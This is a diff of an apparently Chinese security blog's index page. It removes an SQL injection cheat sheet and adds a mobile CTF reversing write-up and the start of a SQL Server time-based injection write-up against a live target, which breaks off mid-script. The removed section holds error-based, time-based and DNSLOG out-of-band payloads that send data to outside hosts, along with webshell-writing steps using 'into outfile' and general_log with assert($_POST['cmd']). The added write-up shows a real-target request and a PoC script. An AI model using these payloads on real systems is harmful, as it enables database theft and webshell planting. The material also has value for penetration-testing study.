-</blockquote>
-</li>
-<li><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/column/158705.html">Xpath报错</a></p>
-<p> 条件：Mysql&gt;5.1.5</p>
- <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">//updatexml():对xml进行查询和修改</span><br><span class="line">id=1&#x27; and updatexml(1,concat(0x26,(version()),0x26),1)--+</span><br><span class="line">id=1&#x27; and updatexml(1,concat(0x3a,(select username from security.users limit 1)), 1)--+</span><br><span class="line">//extractvalue():对xml进行查询和修改</span><br><span class="line">id=1&#x27; and (extractvalue(1,concat(0x26,(version()),0x26)))--+</span><br><span class="line"></span><br><span class="line">1&#x27; and updatexml(0,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;dvwa&#x27;),0)-- -</span><br><span class="line">1&#x27; and updatexml(1,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;),1)-- -</span><br><span class="line">1&#x27; and extractvalue(0,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;dvwa&#x27;))-- -</span><br></pre></td></tr></table></figure>
-<p> 报错注入只能爆出32位，结合substring爆出64位flag</p>
-</li>
-<li><p><a target="_blank" rel="noopener" href="https://www.lsablog.com/networksec/penetration/error-based-blind-sqli/">整数溢出报错</a></p>
-<p> exp(x):计算e的x次方，需要Mysql&gt;5.5.5</p>
-<p> 原理：Exp()超过710会产生溢出。</p>
-<p> Payload: </p>
- <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; and (EXP(~(select * from(select version())a)))--+ //未试验成功</span><br></pre></td></tr></table></figure></li>
-</ol>
-<h4 id="二、无回显"><a href="#二、无回显" class="headerlink" title="二、无回显"></a>二、无回显</h4><h4 id="1-基于时间"><a href="#1-基于时间" class="headerlink" title="1. 基于时间"></a>1. 基于时间</h4><ul>
-<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/cyjaysun/p/4463979.html">延迟函数</a></li>
-</ul>
-<ol>
-<li><p>Mssql：</p>
-<p> waitfor {DELAY ‘time’ | TIME ‘time’}, time格式为“时:分:秒”。（无sleep函数）</p>
- <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; waitfor delay &#x27;0:0:5&#x27;;--+</span><br></pre></td></tr></table></figure></li>
-<li><p>Mysql：</p>
-<p> BENCHMARK将一个表达式执行许多次：</p>
- <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; and(SELECT BENCHMARK(10000000,ENCODE(&#x27;hello&#x27;,&#x27;mom&#x27;))) and 1=1--+ //BENCHMARK(count, express)</span><br></pre></td></tr></table></figure>
-<p> sleep()函数：</p>
- <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; and(select sleep(5)) and 1=1--+</span><br><span class="line">1&#x27; and if(LENGTH(DATABASE())=13,SLEEP(1),0);</span><br><span class="line">1&#x27; and if(ord(SUBSTRING(user(),1,1))=114,SLEEP(1),0);</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>Postgresql</p>
-<p> 最新版本的PostgreSQL数据库(8.2及以上版本)中，可以使用pg_sleep函数来引起延迟：<code>id=1&#39; and SELECT pg_sleep(10);--+</code></p>
-</li>
-<li><p>Oracle:</p>
-<p> DBMS_PIPE.RECEIVE_MESSAGE函数将为从RDS管道返回的数据等待10秒。默认情况下，允许以public权限执行该包。 </p>
- <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; or 1=dbms_pipe.receive_message(&#x27;RDS&#x27;, 10)--+ //</span><br></pre></td></tr></table></figure></li>
-</ol>
-<h4 id="2-基于bool"><a href="#2-基于bool" class="headerlink" title="2. 基于bool"></a>2. 基于bool</h4><h4 id="3-DNSLOG带外"><a href="#3-DNSLOG带外" class="headerlink" title="3. DNSLOG带外"></a>3. DNSLOG带外</h4><p>mysql的secure_file_priv为空的时候可以使用,版本基本在5.5.53之前。(经测试，5.5.2也不能成功带外)</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select load_file(&quot;////test.hcg10m.dnslog.cn//a.txt&quot;);</span><br><span class="line">select load_file(concat(&quot;////&quot;, version(), &quot;.8em7js.ceye.io//a.txt&quot;));</span><br></pre></td></tr></table></figure>
-
-<h2 id="0x02-如何区分后端数据库"><a href="#0x02-如何区分后端数据库" class="headerlink" title="0x02 如何区分后端数据库"></a>0x02 <a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_34275734/article/details/91816289">如何区分后端数据库</a></h2><h3 id="1-看报错"><a href="#1-看报错" class="headerlink" title="1. 看报错"></a>1. 看报错</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Oracle：</span><br><span class="line">ORA-00933: SQL command not properly ended</span><br><span class="line"></span><br><span class="line">MS SQL Server：</span><br><span class="line">Microsoft SQL Native Client error &#x27;80040e14&#x27;</span><br><span class="line">Unclosed quotation mark after the character string</span><br><span class="line"></span><br><span class="line">PostgreSQL：</span><br><span class="line">Query failed: ERROR: syntax error at or near &quot;&#x27;&quot; at character 56 in /www/site/test.php on line 121.</span><br></pre></td></tr></table></figure>
-<h3 id="2-通过各个数据库特有的数据表和环境变量来判断"><a href="#2-通过各个数据库特有的数据表和环境变量来判断" class="headerlink" title="2. 通过各个数据库特有的数据表和环境变量来判断"></a>2. 通过各个数据库特有的数据表和环境变量来判断</h3><ul>
-<li><p>Oracle:</p>
-  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1 and (select count(*) from sys.user_tables)&gt;0 and 1=1</span><br></pre></td></tr></table></figure></li>
-<li><p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1056134">Mssql </a></p>
-<ul>
-<li>特有的系统表</li>
-</ul>
-<p>  sysdatabases: 存储了所有的数据库，sysobjects存储了所有的数据库表。<code>select * from master.dbo.sysdatabases</code>就可以查询出所有的库名。 </p>
-<p>  Sysobjects：SQL-SERVER的每个数据库内都有此系统表，它存放该数据库内创建的所有对象，如约束、默认值、日志、规则、存储过程等，每个对象在表中占一行。</p>
-  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1 and (select count(*) from )&gt;0 and 1=1</span><br></pre></td></tr></table></figure>
-<p>  syscolumns：每个表和视图中的每列在表中占一行，存储过程中的每个参数在表中也占一行。该表位于每个数据库中。主要字段有：</p>
-<ul>
-<li>系统变量</li>
-</ul>
-<p>  SQL－SERVER有user,db_name(),@@VERSION等系统变量，利用这些系统值不仅可以判断SQL-SERVER，而且还可以得到大量有用信息。(无version()函数)</p>
-  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">abc.asp?p=YY and user&gt;0 不仅可以判断是否是SQL-SERVER，而还可以得到当前连接到数据库的用户名</span><br><span class="line"></span><br><span class="line">abc.asp?p=YY&amp;n ... db_name()&gt;0 不仅可以判断是否是SQL-SERVER，而还可以得到当前正在使用的数据库名；</span><br></pre></td></tr></table></figure></li>
-<li><p>Mysql:</p>
-  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; and (select count(*) from information_schema.TABLES)&gt;0 and 1=1--+</span><br></pre></td></tr></table></figure></li>
-</ul>
-<h3 id="3-通过各数据库特有的连接符判断数据库类型"><a href="#3-通过各数据库特有的连接符判断数据库类型" class="headerlink" title="3. 通过各数据库特有的连接符判断数据库类型"></a>3. 通过各数据库特有的连接符判断数据库类型</h3><ol>
-<li><p>mssql数据库</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/test.php?id=1 and &#x27;1&#x27; + &#x27;1&#x27; = &#x27;11&#x27;</span><br></pre></td></tr></table></figure></li>
-<li><p>mysql数据库</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/test.php?id=1 and &#x27;1&#x27; + &#x27;1&#x27; = &#x27;2&#x27;</span><br><span class="line">http://127.0.0.1/test.php?id=1 and CONCAT(&#x27;1&#x27;,&#x27;1&#x27;)=&#x27;11&#x27;</span><br></pre></td></tr></table></figure></li>
-<li><p>oracle数据库</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/test.php?id=1 and &#x27;1&#x27;||&#x27;1&#x27;=&#x27;11&#x27;</span><br><span class="line">http://127.0.0.1/test.php?id=1 and CONCAT(&#x27;1&#x27;,&#x27;1&#x27;)=&#x27;11&#x27;</span><br></pre></td></tr></table></figure></li>
-</ol>
-<h2 id="0x03-注入位置"><a href="#0x03-注入位置" class="headerlink" title="0x03 注入位置"></a>0x03 注入位置</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from tables where id=[子查询] order by [子查询, PROCEDURE ANALYSE] limit [PROCEDURE ANALYSE, INTO...LINES TERMINATED BY]</span><br></pre></td></tr></table></figure>
-
-<h3 id="1-limit注入"><a href="#1-limit注入" class="headerlink" title="1. limit注入"></a>1. limit注入</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$sql = &quot;SELECT id FROM test WHERE id &gt; 0 ORDER BY id LIMIT &quot;.$_GET[&#x27;num&#x27;];</span><br></pre></td></tr></table></figure>
-
-<p>limit注入分有无<code>order by</code>. 若无<code>order by</code>可以使用union select，存在<code>order by</code>可以使用<code>procedure analyse()</code>报错注入和<code>into outfile &#39;&#39; lines terminated by</code>写文件。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num=1 into outfile &#x27;D:\\phpstudy_pro\\WWW\\test123.php&#x27; LINES TERMINATED BY 0x3C3F7068702061737365727428245F504F53545B70765D293B3F3E</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>procedure analysis此方法只适用于小于5.6.6的5.x系列。into 需要有file权限</p>
-</blockquote>
-<h3 id="2-order-by注入"><a href="#2-order-by注入" class="headerlink" title="2. order by注入"></a>2. order by注入</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$sql = &quot;select * from test order by &quot;.$_GET[&#x27;order&#x27;];</span><br></pre></td></tr></table></figure>
-<p>order by后可直接跟子查询</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">order=updatexml(1,concat(0x3a,user(),0x3a),1)</span><br><span class="line">order=updatexml(1,concat(0x3a,(select id from test limit 1),0x3a),1)</span><br><span class="line">extractvalue(1,concat(0x3a,user(),0x3a))</span><br></pre></td></tr></table></figure>
-<h3 id="3-表名注入"><a href="#3-表名注入" class="headerlink" title="3. 表名注入"></a>3. 表名注入</h3><p><code>show columns from $table</code>show的语法如下。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SHOW [FULL] COLUMNS &#123;FROM | IN&#125; tbl_name [&#123;FROM | IN&#125; db_name]</span><br><span class="line">[LIKE &#x27;pattern&#x27; | WHERE expr]</span><br></pre></td></tr></table></figure>
-<p>后面可以直接跟where子查询：<code>SHOW COLUMNS FROM </code>test<code> WHERE UPDATEXML(1,user(),1);</code></p>
-<p>还有<code>describe $table</code>, <code>update $table</code>等。</p>
-<h2 id="0x04-绕过"><a href="#0x04-绕过" class="headerlink" title="0x04 绕过"></a>0x04 绕过</h2><h3 id="1-替换逗号"><a href="#1-替换逗号" class="headerlink" title="1. 替换逗号"></a>1. 替换逗号</h3><ol>
-<li><p>substring from…for</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select ascii(mid(user(),1,2)) -&gt; select ascii(substring(user() from 1 for 1))</span><br></pre></td></tr></table></figure></li>
-<li><p><code>like &#39;a%&#39;</code> 成功再测试 <code>like &#39;aa%&#39;</code>、 <code>like &#39;ab%&#39;</code> … <code>like &#39;az%&#39;</code> 直到第二个字符正确，再测试第三个。</p>
-</li>
-<li><p><code>select user() regexp &#39;^a&#39;</code></p>
-</li>
-</ol>
-<h3 id="2-符号替换"><a href="#2-符号替换" class="headerlink" title="2. 符号替换"></a>2. 符号替换</h3><p><img src="./sql_waf_bypass.jpg" alt="image"></p>
-<h3 id="3-sqlmap-tamper"><a href="#3-sqlmap-tamper" class="headerlink" title="3. sqlmap tamper"></a>3. sqlmap tamper</h3><blockquote>
-<p>过waf tamper相关<br><br>与burp联合，sqlmap4burp，gason，sqlipy</p>
-</blockquote>
-<h2 id="0x05-getshell"><a href="#0x05-getshell" class="headerlink" title="0x05 getshell"></a>0x05 getshell</h2><h3 id="1-注入写shell"><a href="#1-注入写shell" class="headerlink" title="1. 注入写shell"></a>1. 注入写shell</h3><p>mysql的secure_file_priv参数限制了的导入导出的文件权限，只能将文件导入或导出到指定位置（一般不能导出到web目录）。</p>
-<p>这个参数不能动态更改，只能在mysql的配置文件中进行修改，然后重启生效。</p>
-<blockquote>
-<p>show variables like ‘%secure%’. 其中当参数 secure_file_priv 为空时，对导入导出无限制<br><br>当值为一个指定的目录时，只能向指定的目录导入导出<br><br>当值被设置为NULL时，禁止导入导出功能</p>
-</blockquote>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select &#x27;&lt;?phpinfo();?&gt;&#x27; into dumpfile &#x27;D:\\test.php&#x27;;</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">注入payload：</span><br><span class="line">id=1&#x27; union select 1,&#x27;123&#x27; into dumpfile &#x27;D:/xxx/xxx/shell.php&#x27;-- -</span><br></pre></td></tr></table></figure>
-<ul>
-<li>dumpfile/outfile/load_file区别参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/zztac/p/11371149.html">dumpfile/outfile/load_file</a></li>
-</ul>
-<h3 id="2-日志写shell"><a href="#2-日志写shell" class="headerlink" title="2. 日志写shell"></a>2. 日志写shell</h3><p>general_log</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">set global general_log=&#x27;on&#x27;;</span><br><span class="line"></span><br><span class="line">SET global general_log_file=&#x27;E:/UPUPW_AP5.6-1510/UPUPW_AP5.6/htdocs/classes.php&#x27;; </span><br><span class="line"></span><br><span class="line">SELECT &#x27;&lt;?php assert($_POST[&quot;cmd&quot;]);?&gt;&#x27;;</span><br></pre></td></tr></table></figure>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://example.com/2021/07/03/Summary_of_interview_knowledge/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1164,6 +689,1056 @@
 
 
     
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2020/11/01/ctf-mobile-writeup/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="欣海余诚's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/11/01/ctf-mobile-writeup/" itemprop="url">一道入门mobile题writeup</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-11-01T20:39:48+08:00">
+                2020-11-01
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index">
+                    <span itemprop="name">CTF</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>作为一个mobile小白，花了一天时间才做出这道题，踩了很多坑的同时也收获了很多，特此记录一下。</p>
+<h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>根据弹出的提示，并得到一串字符。</p>
+<p><img src="1.png" alt="image"></p>
+<p>附件中是一个apk，打开后只有一个界面。</p>
+<p><img src="2.png" alt="image"></p>
+<h2 id="反编译apk"><a href="#反编译apk" class="headerlink" title="反编译apk"></a>反编译apk</h2><p>使用jadx-gui打开apk，看反编译代码：</p>
+<p><img src="3.png" alt="image"></p>
+<p>先看入口MainActivity。使用DES解密函数解密一个base64字符串，将结果传入getflag函数（该函数是通过native接口调用的so库中的函数），对比getflag结果和在界面上输入的key值。如果不一致，显示“这是个陷阱，快醒醒！”，如果一致，提示“再使用函数获取 Flag”。</p>
+<p>其中DES解密函数在CryptoUtil类：</p>
+<p><img src="4.png" alt="image"></p>
+<p>乍一看，需要让这个判断相等，就能得到flag。现在回过头看，这里并没有获取flag的代码，仅仅是弹一个消息框。</p>
+<p>apk中还有另外两个资源文件：<code>Addon.jar</code>和<code>libnative.so</code>。前者是MainApplication.java中使用，用于通过字节异或的方式生成CryptoUtil.jar，调用其中的DES解密方法进行解密。后者是通过native接口加载，调用其getflag方法。</p>
+<p>对于一个小白来说，每个线索都不想放过，所以我针对Addon.jar一顿研究和操作，最后得到的代码是这样的：</p>
+<p><img src="5.png" alt="image"></p>
+<p>WTF??!解密函数直接throw一个异常。上当的我这才发现事情不对，转去研究libnative.so。</p>
+<h2 id="逆向so库"><a href="#逆向so库" class="headerlink" title="逆向so库"></a>逆向so库</h2><p>ida打开，定位getFlag函数：</p>
+<p><img src="6.png" alt="image"></p>
+<p>大致逻辑为：对一个字符串先进行base64解密，再进行AES解密，返回最后的result。中间穿插着各种无用的代码。。</p>
+<p>字符串是已知的，双击texta就能刚看到：</p>
+<p><img src="7.png" alt="image"></p>
+<p>接下来解决AES解密。</p>
+<h2 id="AES解密"><a href="#AES解密" class="headerlink" title="AES解密"></a>AES解密</h2><p>首先要知道，AES解密需要有密文、密钥、初始向量、密钥长度、填充模式、加密模式。decryptAES256cbc函数已经告诉了密钥长度是256位（32字节）、加密模式cbc。初始向量iv双击也可以看到，仅剩密钥未知。</p>
+<p><img src="8.png" alt="image"></p>
+<p>目光聚焦至v7变量。v7调用了GetStringUTFChars函数（该函数声明如下），获取了传入的参数a3的地址。</p>
+<p>根据MainActivity中对getflag的调用，传入的参数是一串密文经过base64和DES解密后的值。盲猜这个解密后的密文就是这里的密钥。</p>
+<p><img src="9.png" alt="image"></p>
+<p>对MainActivity中的密文进行<code>base64</code>+<code>DES</code>解密，得<code>FebRuAry*29th^TweNty-0ne_hUndrEd</code>，刚好32位。</p>
+<p><img src="10.png" alt="image"></p>
+<p>参数齐了，在线AES解密一波，得flag。</p>
+<p><img src="11.png" alt="image"></p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
+<li><p><a target="_blank" rel="noopener" href="https://www.keylala.cn/aes">AES在线加密</a> </p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://docs.oracle.com/javase/8/docs/technotes/guides/jni/spec/functions.html#NewStringUTF">Chapter 4: JNI Functions</a> </p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/duanxz/p/3651347.html">Java native关键字</a> </p>
+</li>
+</ul>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2020/09/22/blindsql-injection-poc/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="欣海余诚's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/09/22/blindsql-injection-poc/" itemprop="url">挖洞经历之SQLServer time-based注入</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-09-22T00:32:13+08:00">
+                2020-09-22
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/WEB%E5%AE%89%E5%85%A8/" itemprop="url" rel="index">
+                    <span itemprop="name">WEB安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>使用xray扫出目标username参数存在sql注入：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /templates/index/hrlogon.do HTTP/1.1</span><br><span class="line">Host: xxx.com</span><br><span class="line">Content-Length: 84</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http://xxx.com</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Referer: http://xxx.com/templates/index/hrlogon.jsp</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line">Cookie: appdate=2020.09.21; bosflag=hl; JSESSIONID=13E35873CC53C0B4598A2FD66F8B348C; radius=14.103.218.82; uudid=cms1553b202-f079-153c-38ac-1c3dbb2135c5</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">logon.x=link&amp;username=admin&#x27;;waitfor/**/delay&#x27;0:0:3&amp;password=test&amp;appdate=2020-09-21</span><br></pre></td></tr></table></figure>
+
+<p>尝试payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27;;waitfor/**/delay&#x27;0:0:1</span><br><span class="line">admin&#x27;;waitfor/**/delay&#x27;0:0:3</span><br></pre></td></tr></table></figure>
+<p>返回的时间明显不一样。</p>
+<p>猜测数据库名的长度：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27;;if(len(db_name())=4)waitfor/**/delay&#x27;0:0:5&#x27;else/**/waitfor/**/delay&#x27;0:0:2</span><br><span class="line">admin&#x27;;if(len(db_name())=5)waitfor/**/delay&#x27;0:0:5&#x27;else/**/waitfor/**/delay&#x27;0:0:2</span><br><span class="line">admin&#x27;;if(len(db_name())=6)waitfor/**/delay&#x27;0:0:5&#x27;else/**/waitfor/**/delay&#x27;0:0:2</span><br></pre></td></tr></table></figure>
+<p>试了多次后基本判定存在注入无疑，并且数据库名长度为5。编写poc脚本，利用二分法猜解。</p>
+<p><img src="db_length.jpg" alt="image"></p>
+<p><img src="db_name.jpg" alt="image"></p>
+<p>poc脚本：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">#coding=utf-8</span><br><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    &#x27;Origin&#x27;:&#x27;http://xxx.com&#x27;,</span><br><span class="line">    &#x27;Content-Type&#x27;:&#x27;application/x-www-form-urlencoded&#x27;,</span><br><span class="line">    &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36&#x27;,</span><br><span class="line">    &#x27;Accept&#x27;: &#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&#x27;,</span><br><span class="line">    &#x27;Referer&#x27;: &#x27;http://xxx.com/templates/index/hrlogon.jsp&#x27;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">url = &#x27;http://xxx.com/templates/index/hrlogon.do&#x27;</span><br><span class="line">def 